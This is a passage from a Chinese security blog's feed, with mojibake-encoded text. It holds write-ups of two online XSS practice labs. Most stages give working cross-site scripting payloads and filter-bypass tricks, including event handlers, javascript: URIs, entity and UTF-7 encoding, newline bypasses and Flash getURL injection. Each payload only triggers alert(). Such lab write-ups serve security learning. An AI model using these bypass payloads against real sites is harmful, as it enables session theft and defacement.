rel="external">https://www.waitalone.cn/the-seven-principles-of-xss-defense.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;å¿ƒå¾—&quot;&gt;&lt;a href=&quot;#å¿ƒå¾—&quot; class=&quot;headerlink&quot; title=&quot;å¿ƒå¾—&quot;&gt;&lt;/a&gt;å¿ƒå¾—&lt;/h3&gt;&lt;p&gt;æ¥ç€ä¸Šä¸€æ–‡è¿‡æ¥ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯ä¸ªäººçš„ä¸€äº›æ€»ç»“ã€‚å¯¹äºæŒ–æ˜xssæ¼æ´ï¼Œç›®çš„éƒ½æ˜¯è®©è‡ªå·±çš„payloadå¯ä»¥æ‰§è¡Œï¼Œåœ¨å…¶æ¢ç´¢çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä¸ªäººé¦–å…ˆä¼šé€šè¿‡å®¡æŸ¥å…ƒç´ ï¼Œäº†è§£å…¶è¾“å…¥ç‚¹ï¼Œè¿‡æ»¤è§„åˆ™ï¼Œç„¶å
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘ä¸XSSçš„æ„Ÿæƒ…ä¹‹è·¯(2)</title>
    <link href="http://sunu11.com/2017/07/23/13/"/>
    <id>http://sunu11.com/2017/07/23/13/</id>
    <published>2017-07-23T03:43:55.000Z</published>
    <updated>2018-11-03T11:56:48.470Z</updated>
    
    <content type="html"><![CDATA[<p>æ¥ç€ä¸Šä¸€æ–‡è¿‡æ¥ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯ç¬¬äºŒä¸ªç¯å¢ƒçš„åšé¢˜è®°å½•ã€‚<a id="more"></a></p><h2 id="å¹³å°2-xsqler-win"><a href="#å¹³å°2-xsqler-win" class="headerlink" title="å¹³å°2 xsqler.win"></a>å¹³å°2 <a href="http://sqler.win/xss/index.php" target="_blank" rel="external">xsqler.win</a></h2><p><strong><em>Stage#1: <a href="http://sqler.win/xss/level1.php?name=test" target="_blank" rel="external">http://sqler.win/xss/level1.php?name=test</a></em></strong><br>æœ¬å…³ç®€å•ï¼Œä½¿ç”¨svg\body\style \ iframeç­‰æ ‡ç­¾å‡å¯è¿‡å…³ã€‚<br>payload: <code>http://sqler.win/xss/level1.php?name=test&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#2: <a href="http://sqler.win/xss/level2.php?keyword=test" target="_blank" rel="external">http://sqler.win/xss/level2.php?keyword=test</a></em></strong><br>æœ¬é¢˜ä¸ç¬¬ä¸€é¢˜å·®ä¸å¤šï¼Œåªéœ€è¦è¿›è¡Œæ ‡ç­¾çš„é—­åˆå³å¯ã€‚<br>payload:<br><code>http://sqler.win/xss/level2.php?keyword=test&quot;&gt;&lt;body/onload=alert(1)&gt;</code></p><p><strong><em>Stage#3ï¼š<a href="http://sqler.win/xss/level3.php?writing=wait" target="_blank" rel="external">http://sqler.win/xss/level3.php?writing=wait</a></em></strong><br>æœ¬é¢˜é€šè¿‡æµ‹è¯•ï¼Œå¯å¾—çŸ¥è¿‡æ»¤äº†&lt;&gt;ï¼Œä¸”åªèƒ½ç”¨â€™é—­åˆæ ‡ç­¾ã€‚äºæ˜¯é‡‡ç”¨onäº‹ä»¶å‹å¦‚onmouseoverã€onmouseoutã€onclickç­‰è¿›è¡Œç»•è¿‡ã€‚Payload: <code>&#39;onmouseover=&#39;alert(1)</code></p><p><strong><em>Stage#4: <a href="http://sqler.win/xss/level4.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level4.php?keyword=</a></em></strong><br>æœ¬é¢˜ä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œä½¿ç”¨â€é—­åˆæ ‡ç­¾å³å¯ï¼špayloadï¼š<code>&quot;onmouseover=&#39;alert(1)â€™</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-13.png" alt="å›¾13"></p><p><strong><em>Stage#5: <a href="http://sqler.win/xss/level5.php?keyword=find" target="_blank" rel="external">http://sqler.win/xss/level5.php?keyword=find</a> a way out! </em></strong><br>æœ¬é¢˜æ¯”è¾ƒç®€å•ï¼Œå¢åŠ äº†è¿‡æ»¤èŒƒå›´ï¼Œon-&gt;o_n ç„¶åéœ€è¦é—­åˆã€‚å¯ä»¥ä½¿ç”¨<code>&quot;&gt;&lt;a href=javascript:alert(1)&gt;</code>é€šè¿‡ç‚¹å‡»å‡ºç°çš„é“¾æ¥è¿›è¡Œé€šå…³ã€‚</p><p><strong><em>Stage#6: <a href="http://sqler.win/xss/level6.php?keyword=break" target="_blank" rel="external">http://sqler.win/xss/level6.php?keyword=break</a> it out! </em></strong><br>éšä¾¿å“ªä¸€ä¸ªè¯•ä¸€ä¸‹ï¼Œå¤„ç†æ‰äº†srcã€herfã€onxxxã€ç­‰ï¼Œéœ€è¦è¿›è¡Œç»•è¿‡ï¼Œé€šè¿‡å¤§å°å†™ï¼ŒæˆåŠŸç»•è¿‡payloadï¼š<code>&quot;&gt;&lt;a HRef=javascript:alert(1)&gt;</code></p><p><strong><em>Stage#7: <a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>æœ¬é¢˜å¯¹è¾“å…¥çš„scriptã€onç­‰è¿›è¡Œäº†å•å±‚è¿‡æ»¤ï¼Œå¯ä»¥ä½¿ç”¨å…¶è¿‡æ»¤ä¸ä¸¥ï¼Œé‡‡ç”¨æ­¤ç±»payloadç»•è¿‡å³å¯ï¼š<code>&lt;svg/oonnload=alert(1)&gt;ã€æˆ–è€…å°†scriptå†™æˆscrscriptipt</code>çš„æ–¹å¼æ„é€ å³å¯ã€‚</p><p><strong><em>Stage#8:<a href="http://sqler.win/xss/level7.php?keyword=move" target="_blank" rel="external">http://sqler.win/xss/level7.php?keyword=move</a> up! </em></strong><br>æœ¬é¢˜å·²ç»ç»™å‡ºäº†ä¸€ä¸ª<a>æ ‡ç­¾,ä½†æ˜¯è¿‡æ»¤äº†scriptã€srcç­‰ï¼Œå¤§å°å†™æ— æ³•ç»•è¿‡ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨htmlç¼–ç è¿›è¡Œç»•è¿‡payloadï¼š<code>javasc&amp;#114;ipt:alert(1)</code></a></p><p><strong><em>Stage#9ï¼š<a href="http://sqler.win/xss/level9.php?keyword=not" target="_blank" rel="external">http://sqler.win/xss/level9.php?keyword=not</a> bad! </em></strong><br>æœ¬é¢˜æœ€å¤§çš„éš¾ç‚¹åœ¨äºç»•åˆæ³•è¿æ¥ï¼Œå‘ç°åªæœ‰å¸¦<code>http://</code>çš„urlæ‰èƒ½è¢«è®¤ä¸ºæ˜¯åˆæ³•é“¾æ¥ï¼Œå¦å¤–ç”±äºâ€œâ€ä¹Ÿè¢«è¿‡æ»¤ï¼Œå…¶ä»–è§„åˆ™ä¸ä¸Šä¸€å…³ç›¸åŒï¼Œå› æ­¤éœ€è¦è¿›è¡Œç¼–ç ã€‚äºæ˜¯æ„é€ payloadï¼š <code>javascr&amp;#105pt:alert(&amp;#34;http://x&amp;#34;)</code></p><p><strong><em>Stage#10ï¼š<a href="http://sqler.win/xss/level10.php?keyword=well" target="_blank" rel="external">http://sqler.win/xss/level10.php?keyword=well</a> done! </em></strong><br>æœ¬é¢˜å­˜åœ¨ä¸‰ä¸ªéšè—è¾“å…¥æ¡†ï¼Œæ„é€ å¦‚ä¸‹getè¯·æ±‚ï¼ŒæŸ¥çœ‹å…ƒç´ åï¼Œå‘ç°t_sortèƒ½è¢«å†™å…¥ï¼Œå¦‚å›¾ï¼š<br>getè¯·æ±‚ï¼š<a href="http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333" target="_blank" rel="external">http://sqler.win/xss/level10.php?t_link=111&amp;t_history=222&amp;t_sort=333</a></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-14.png" alt="å›¾14"></p><p>å› æ­¤åªéœ€è¦åœ¨è¯¥å‚æ•°å¤„æ„é€ è·¨ç«™è„šæœ¬è¯­å¥å³å¯ï¼Œä½¿ç”¨<code>&quot;onmouseover=&#39;alert(1)&#39;</code>ç„¶åè®©è¾“å…¥æ¡†å±æ€§æ˜¾ç¤ºå‡ºæ¥æ”¹hiddenä¸ºtextå³å¯ï¼špayloadå¦‚ä¸‹ï¼š<br><code>http://sqler.win/xss/level10.php?t_sort=&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#11ï¼š<a href="http://sqler.win/xss/level11.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level11.php?keyword=good</a> job! </em></strong><br>é€šè¿‡æŸ¥çœ‹å…ƒç´ ï¼Œå‘ç°t_refçš„valueæ˜¯æˆ‘ä»¬è¿™ä¸ªç½‘é¡µçš„refererå€¼ï¼ŒæŠ“åŒ…ä¿®æ”¹refererè¾“å…¥xss payloadï¼š<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code>å³å¯ï¼Œæœ¬é¢˜ä¸æƒ³å¤šè¯´ä»€ä¹ˆï¼Œæ„Ÿè§‰refererä¸€èˆ¬å­˜åœ¨xssçš„æå°‘ã€‚</p><p><strong><em>Stage#12ï¼š<a href="http://sqler.win/xss/level12.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level12.php?keyword=good</a> job! </em></strong><br>æŸ¥çœ‹å…ƒç´ å¯çœ‹åˆ°t_uaå‚æ•°çš„valueæ˜¯User-Agentå€¼ï¼Œå’Œä¸Šä¸€é¢˜ä¸€æ ·ï¼Œä¿®æ”¹ä¸ºxss payloadå³å¯ï¼š<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;</code></p><p><strong><em>Stage#13ï¼š<a href="http://sqler.win/xss/level13.php?keyword=good" target="_blank" rel="external">http://sqler.win/xss/level13.php?keyword=good</a> job! </em></strong><br>æ­¤é¢˜æ€è·¯åŒä¸Šï¼Œè¿™æ¬¡ä¼ å‚ä½ç½®ä¸ºcookieï¼Œpayloadï¼š<code>&quot;onmouseover=&#39;alert(1)&#39; type=&#39;text&#39;ï¼›</code>æ„Ÿè§‰è¿™ä¸‰é¢˜æ˜¯ç»•è„‘æ´çš„æ ·å­ï¼Œï¼Œï¼Œä½†æ˜¯åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­è¿˜çœŸæ²¡å‘ç°è¿‡ï¼Œï¼Œï¼Œï¼Œ</p><p><strong><em>Stage#14ï¼š<a href="http://sqler.win/xss/level14.php" target="_blank" rel="external">http://sqler.win/xss/level14.php</a></em></strong><br>æœ¬é¢˜å¯ä»¥åœ¨æŸ¥çœ‹å…ƒç´ å‘ç°åµŒå…¥äº†ä¸€ä¸ªiframeé¡µé¢ï¼Œè®¿é—®è¯¥é¡µé¢æ˜¯æŸ¥çœ‹å›¾ç‰‡EXIFä¿¡æ¯çš„ï¼Œé€šè¿‡çœ‹ç­”æ¡ˆçŸ¥é“æœ‰EXIFåœ¨è§£æè¿‡ç¨‹ä¸­ï¼ŒæŸäº›æ’ä»¶åœ¨è§£ææ—¶è¾“å‡ºæœªå¤„ç†å¯å¯¼è‡´xssæ¼æ´ï¼Œå› æ­¤é£Ÿç”¨exiftoolå·¥å…·ï¼Œä¿®æ”¹å›¾ç‰‡EXIFåï¼Œè¿›è¡Œä¸Šä¼ ï¼Œç„¶åè§£æè¿‡ç¨‹ä¸­å¼¹çª—ã€‚å­¦ä¹ äº†ï¼Œï¼Œï¼Œï¼Œ </p><p><strong><em>Stage#15ï¼š<a href="http://sqler.win/xsschallenge/level15.php?src=1.jpg" target="_blank" rel="external">http://sqler.win/xsschallenge/level15.php?src=1.jpg</a></em></strong><br>æœ¬å…³è¯´æ˜¯åˆ©ç”¨srcå¯åŒ…å«å‰é¢é¡µé¢ä¸Šçš„xssæ¼æ´ï¼Œç„¶åè¿›è¡Œå¼¹çª—ï¼Œæ€ä¹ˆå°è¯•éƒ½æ²¡å¼¹å‡ºæ¥ï¼Œï¼Œï¼Œè¡¨ç¤ºæ— å¥ˆã€‚ã€‚ã€‚ã€‚ã€‚</p><p><strong><em>Stage#16ï¼š<a href="http://sqler.win/xss/level16.php?keyword=" target="_blank" rel="external">http://sqler.win/xss/level16.php?keyword=</a></em></strong><br>æœ¬é¢˜ç»ˆäºå›åˆ°å¸¸è§„ç»•çš„æ€è·¯ä¸Šäº†ï¼Œï¼Œç»è¿‡å°è¯•ï¼Œå¯ä»¥åˆ¤æ–­è¿‡æ»¤äº†ç©ºæ ¼ï¼Œ/ç­‰ç¬¦å·ï¼Œç„¶åå°è¯•ç»•è¿‡ï¼Œå¾ˆå¤šå§¿åŠ¿éƒ½ä¸è¡Œï¼ŒåŒ…æ‹¬ç¼–ç ï¼Œè¿›åˆ¶ï¼Œæˆªæ–­ç­‰ç„¶åå‘ç°æ¢è¡Œç¬¦å¯ä»¥ç»•è¿‡ï¼š%0aã€%0dï¼Œå› æ­¤ï¼Œpayloadï¼š<br><code>http://sqler.win/xss/level16.php?keyword=&lt;svg%0aonload=alert(1)&gt;</code></p><p><strong><em>Stage#17ï¼š<a href="http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level17.php?arg01=a&amp;arg02=b</a></em></strong><br>æœ¬é¢˜æ¯”è¾ƒç®€å•ï¼Œåœ¨arg02å‚æ•°å€¼ä¸­å†™å…¥äº‹ä»¶å‹payloadå³å¯è§¦å‘ï¼Œpayload:<br><code>http://sqler.win/xss/level17.php? arg02=%20onmousedown=alert(1)</code></p><p><strong><em>Stage#18ï¼šttp://sqler.win/xss/level18.php?arg01=a&amp;arg02=b</em></strong><br>æœ¬é¢˜ä¸ä¸Šä¸€é¢˜ç›¸ä¼¼ï¼Œä½†æ˜¯arg02æ— æ³•æ„é€ å‡ºç©ºæ ¼ï¼Œä¹Ÿå°±æ²¡åŠæ³•å†™å…¥è¾“å‡ºè¯­å¥ï¼Œç„¶åè¯•äº†è¯•arg01ï¼Œæœç„¶æ¢æ±¤ä¸æ¢è¯ï¼Œç›´æ¥å†™å…¥payloadï¼š<code>%20onmousedown=alert(1)</code></p><p><strong><em>Stage#19ï¼š<a href="http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b" target="_blank" rel="external">http://sqler.win/xss/level19.php?arg01=a&amp;arrg02=b</a></em></strong><br>å³é”®æŸ¥çœ‹å…ƒç´ å¯ä»¥çœ‹åˆ°ä¸€ä¸ªswfæ–‡ä»¶è¢«è°ƒç”¨ï¼Œç„¶åè®¾æƒ³ä¸ºflash xssï¼Œé€šè¿‡ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œä½¿ç”¨JPEXSè¿›è¡Œåˆ†æï¼Œå‘ç°ä¸ºactionscript 2.0ï¼Œç„¶åçŸ¥é“actionscript 2.0æ˜¯æœ‰å¯ä»¥ä½¿ç”¨getURLæ¥æ‰§è¡Œjavascriptä¸‹é¢ä»¥ä¸€ä¸ªå®ä¾‹æ¥å‰–æFlash XSSè¿‡ç¨‹ã€‚æœ‰ç‚¹æ‹—å£ï¼Œï¼Œ,ç„¶åå¯¹åº”æœ¬é¢˜ï¼Œå®šä½geturlå‡½æ•°ï¼š</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-15.png" alt="å›¾15"><br>å¯ä»¥çœ‹åˆ°åœ¨sIFRçš„å†…å®¹ä¸­å½“getURLæ‰“å¼€æ—¶ï¼Œversionæ˜¯å¯ä»¥ä¼ å…¥åˆ°loc4ä¸­çš„ï¼Œå› æ­¤å®šä½contentIsLinkå‡½æ•°ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">function contentIsLink()</div><div class="line">  &#123;</div><div class="line">     return this.content.indexOf(&quot;&lt;a &quot;) == 0 &amp;&amp; (this.content.indexOf(&quot;&lt;a &quot;) == this.content.lastIndexOf(&quot;&lt;a &quot;) &amp;&amp; this.content.indexOf(&quot;&lt;/a&gt;&quot;) == this.content.length - 4);</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p><p>ç„¶åå¯ä»¥æ ¹æ®contentIsLinkå‡½æ•°æ„é€ å‡ºpayload:<br><code>http://sqler.win/xss/level19.php?arg01=version&amp;arg02=%3Ca%20href=%22javascript:alert(1)%22%3E1%3C/a%3E</code></p><p><strong><em>Stage#20ï¼š<a href="http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b" target="_blank" rel="external">http://sqler.win/xss/level20.php?arg01=a&amp;arg02=b</a></em></strong><br>æœ¬é¢˜ä¸ªäººæ„Ÿè§‰æ¯”ä¸Šä¸€é¢˜å®¹æ˜“åšå‡ºæ¥ï¼Œï¼Œä¸‹è½½swfæ–‡ä»¶ä½¿ç”¨JPEXSè¿›è¡Œåˆ†æåå¯ä»¥å‘ç°æ˜¯zeroclipboard.swfï¼Œç„¶åç™¾åº¦ä¸€å‘ï¼Œ<a href="http://www.freebuf.com/sectool/108568.html" target="_blank" rel="external">freebuf</a>ç¬¬ä¸€ä¸ªï¼Œç²˜è´´å³å¯payloadï¼š<br><code>http://sqler.win/xss/xsf04.swf?id=\%22))}catch(e){(alert)(/XSS/.source);}//&amp;width=500&amp;height=500</code><br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-16.png" alt="å›¾16"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æ¥ç€ä¸Šä¸€æ–‡è¿‡æ¥ï¼Œè¿™ä¸€éƒ¨åˆ†æ˜¯ç¬¬äºŒä¸ªç¯å¢ƒçš„åšé¢˜è®°å½•ã€‚
    
    </summary>
    
      <category term="WEBå®‰å…¨" scheme="http://sunu11.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="bypass" scheme="http://sunu11.com/tags/bypass/"/>
    
      <category term="xss" scheme="http://sunu11.com/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>æˆ‘ä¸XSSçš„æ„Ÿæƒ…ä¹‹è·¯(1)</title>
    <link href="http://sunu11.com/2017/07/20/12/"/>
    <id>http://sunu11.com/2017/07/20/12/</id>
    <published>2017-07-20T01:43:55.000Z</published>
    <updated>2018-11-03T11:56:39.525Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç§‘æ™®"><a href="#ç§‘æ™®" class="headerlink" title="ç§‘æ™®"></a>ç§‘æ™®</h2><p>XSSæ¼æ´æ˜¯ä¸€ç§ç»å¸¸å‡ºç°åœ¨webåº”ç”¨ä¸­çš„è®¡ç®—æœºå®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ¶æ„webç”¨æˆ·å°†ä»£ç æ¤å…¥åˆ°æä¾›ç»™å…¶å®ƒç”¨æˆ·ä½¿ç”¨çš„é¡µé¢ä¸­ã€‚æ¯”å¦‚è¿™äº›ä»£ç åŒ…æ‹¬HTMLä»£ç å’Œå®¢æˆ·ç«¯è„šæœ¬ã€‚<a id="more"></a><br>æ”»å‡»è€…åˆ©ç”¨XSSæ¼æ´æ—è·¯æ‰è®¿é—®æ§åˆ¶â€”â€”ä¾‹å¦‚åŒæºç­–ç•¥(same origin policy)ã€‚è¿™ç§ç±»å‹çš„æ¼æ´ç”±äºè¢«é»‘å®¢ç”¨æ¥ç¼–å†™å±å®³æ€§æ›´å¤§çš„ç½‘ç»œé’“é±¼(Phishing)æ”»å‡»è€Œå˜å¾—å¹¿ä¸ºäººçŸ¥ã€‚å¯¹äºè·¨ç«™è„šæœ¬æ”»å‡»ï¼Œé»‘å®¢ç•Œå…±è¯†æ˜¯ï¼šè·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æ–°å‹çš„â€œç¼“å†²åŒºæº¢å‡ºæ”»å‡»â€œï¼Œè€ŒJavaScriptæ˜¯æ–°å‹çš„â€œShellCodeâ€ã€‚æœ¬æ–‡ä¸»è¦æ˜¯é€šè¿‡å‡ ä¸ªåœ¨çº¿ç»ƒä¹ å¹³å°ï¼Œè®°å½•ä¸€ä¸‹ä¸ªäººå¯¹äºxssæ¼æ´çš„ä¸€äº›æ€è·¯å’Œæ€»ç»“ã€‚</p><h2 id="å¹³å°1-xss-quiz"><a href="#å¹³å°1-xss-quiz" class="headerlink" title="å¹³å°1 xss-quiz"></a>å¹³å°1 <a href="http://xss-quiz.int21h.jp" target="_blank" rel="external">xss-quiz</a></h2><p><strong><em>Stage#1: <a href="http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9" target="_blank" rel="external">http://xss-quiz.int21h.jp/?sid=2a75ff06e0147586b7ceb0fe68ee443b86a6e7b9</a></em></strong></p><p>ä½¿ç”¨æ­£å¸¸xss payloadå¼¹å‡ºdomainå³å¯é€šè¿‡ã€‚payloadå¦‚ï¼š<br><code>&lt;img onerrer=&quot;alert(document.domain);&quot;src=&gt; &lt;script&gt;alert(document.domain);&lt;/script&gt;</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-1.png" alt="å›¾1"></p><p><strong><em>Stage#2: <a href="http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage2.php?sid=34ccb7f2bee3d0be52bf33339d0240c96f1cb61d</a></em></strong><br>è¿™ä¸€é¢˜å…³é”®åœ¨äºè¯­å¥éœ€è¦é—­åˆï¼Œå½“é—­åˆè¯­å¥åï¼Œå‡å¯è§¦å‘ã€‚payloadå¦‚ï¼š<br><code>&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;  &quot;onclick=alert(document.domain) value=&quot;asd</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-2.png" alt="å›¾2"></p><p><strong><em>Stage#3: <a href="http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage-3.php?sid=f3a8820ead8d740c43effd6cdae1fa1b41d0f0f7</a></em></strong><br>è¯¥é¢˜åœ¨å†™å…¥jsè¯­å¥åï¼Œå¯¹å°–æ‹¬å·è¿›è¡Œäº†è½¬ä¹‰</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-3.png" alt="å›¾3"></p><p>å°è¯•ç»•è¿‡ï¼Œæ²¡æœ‰å®ç°ï¼Œä½†æ˜¯å¯ä»¥åœ¨p2å‚æ•°çš„å‚æ•°å€¼å¤„æ„é€ è·¨ç«™è¯­å¥ï¼ŒæˆåŠŸå¼¹å‡ºdomain</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-4.png" alt="å›¾4"></p><p><strong><em>Stage#4: <a href="http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage4.php?sid=9b47b7196b1da242b0d9ce4099ed0f17858b56e0</a></em></strong><br>p1ã€p2å‡ä½œè¿‡æ»¤äº†ï¼Œåœ¨p3å¤„é—­åˆè¯­å¥å³å¯å¼¹å‡ºï¼Œå¯é€šè¿‡æŸ¥çœ‹æºç å‘ç°éšè—çš„è¾“å…¥æ¡†ï¼Œä¿®æ”¹hackmeçš„é‚£ä¸ªtypeä¸ºtextï¼Œå³p3çš„è¾“å…¥ç‚¹å³å¯ï¼Œpayloadï¼š<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p><p><strong><em>Stage#5: <a href="http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage5.php?sid=b4d8b0467f463e3059a6e739d37739b6a364027e</a></em></strong><br>é•¿åº¦é™åˆ¶ï¼Œä½¿ç”¨burpæ”¹åŒ…ç»•è¿‡å³å¯ã€‚ä¹Ÿå¯ä»¥æ›´æ”¹å¦‚å›¾æ‰€ç¤ºé•¿åº¦è¿›è¡Œç»•è¿‡ï¼Œpayloadï¼š<br><code>&quot;&gt;&lt;script&gt;alert(document.domain)&lt;/script&gt;</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-5.png" alt="å›¾5"></p><p><strong><em>Stage#6: <a href="http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage6.php?sid=a9998f35ee37ef3664ab6c6fc2574f428231c725</a></em></strong><br>è¯¥é¢˜è¿‡æ»¤äº†å°–æ‹¬å·&lt;&gt;ï¼Œ<br><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-6.png" alt="å›¾6"><br>å°è¯•ç»•è¿‡ï¼Œå‘ç°å¯ç”¨é¼ æ ‡ç§»åŠ¨ç±»è¿›è¡Œç»•è¿‡å¦‚ï¼š<br><code>&quot;onmouseover=&quot;alert(document.domain);&quot; &quot;onmouseout=&quot;alert(document.domain);&quot; &quot;onclick=alert(document.domain)ç­‰</code></p><p><strong><em>Stage#7: <a href="http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage07.php?sid=deeba845f047ee9df2627ec269f20c955e2eb8b8</a></em></strong><br>é€šè¿‡æµ‹è¯•ï¼Œå‘ç°è¯¥é¢˜è¿‡æ»¤äº†&lt;&gt;ã€â€ã€&amp;ç­‰ï¼Œè€Œä¸”è¾“å…¥ç©ºæ ¼åè‡ªåŠ¨æ·»åŠ åŒå¼•å·ï¼Œå› æ­¤ï¼Œå¯æ„é€ æ­¤ç±»payloadå¦‚: <code>a onmouseover=alert(document.domain)</code>å®ç°å¼¹çª—ã€‚</p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-7.png" alt="å›¾7"></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-8.png" alt="å›¾8"></p><p><strong><em>Stage#8: <a href="http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage008.php?sid=1f0696e59ff506dee925f3e6bd62e9f5103543aa</a></em></strong><br>æ­¤é¢˜é‡‡ç”¨javascriptä¼ªåè®®å³å¯ï¼Œæ¯”è¾ƒç®€å•ã€‚Payloadï¼š<code>javascript:alert(document.domain);</code></p><p><em>*</em>Stage#9: <a href="http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage_09.php?sid=9fb2098e09f0cdf338e09149e6f1550706fc3934</a><br>æ­¤é¢˜æç¤ºä¿¡æ¯ä¸ºUTF7,å› æ­¤é€šè¿‡UTF-7è½¬ç å³å¯ï¼Œä¸ç”¨burpæˆªåŒ…ï¼Œéœ€è¦æ›´æ”¹charsetç±»å‹ä¸ºtextï¼Œå¹¶æ›´æ”¹å…¶valueä¸ºUTF-7,ç„¶åå³å¯å¼¹çª—payloadï¼š<br><code>+ACIAIABvAG4AbQBvAHUAcwBlAG0AbwB2AGUAPQAiAGEAbABlAHIAdAAoAGQAbwBjAHUAbQBlAG4AdAAuAGQAbwBtAGEAaQBuACk-</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-9.png" alt="å›¾9"></p><p><strong><em>Stage#10: <a href="http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage00010.php?sid=582038d983e1b7cff0888412ffa49b8ae03ecf38</a></em></strong><br>é€šè¿‡æç¤ºå¯çœ‹åˆ°domainè¢«è¿‡æ»¤äº†ï¼Œå¯ä½¿ç”¨dodomainmainåµŒå¥—çš„æ–¹å¼è¿›è¡Œç»•è¿‡ï¼Œå› æ­¤ï¼Œpayloadä¸ºï¼š<code>&quot;onmouseover=&quot;alert(document.domdomainain);//</code></p><p><strong><em>Stage#11: <a href="http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9" target="_blank" rel="external">http://xss-quiz.int21h.jp/stage11th.php?sid=57ea445522e17a40142908ada7bd665857c358d9</a></em></strong><br>å¯ä»¥ä»æç¤ºä¸­çœ‹åˆ°è¿‡æ»¤è§„åˆ™å¦‚ä¸‹ï¼šâ€s/script/xscript/ig;â€ and â€œs/on[a-z]+=/onxxx=/ig;â€ and â€œs/style=/stxxx=/ig;â€ï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¿›è¡Œç¼–ç çš„æ–¹å¼æ„é€ xssè¯­å¥ã€‚æ³¨æ„é—­åˆå‰åã€‚å³å¯å¼¹çª—ï¼Œpayloadï¼š<br><code>&quot;&gt;&lt;a href=javascr&amp;#105;pt:alert(document.domain)&gt;xss&lt;/a&gt;</code></p><p><img src="http://n-b.oss-cn-beijing.aliyuncs.com/q-10.png" alt="å›¾10"></p><p><strong><em>Stage#12: <a href="http://xss-quiz.int21h.jp/stage_no012.php?sid=7fc1df5b4cd62ce2afaaa11268a5039d3a67632a" target="_blank" 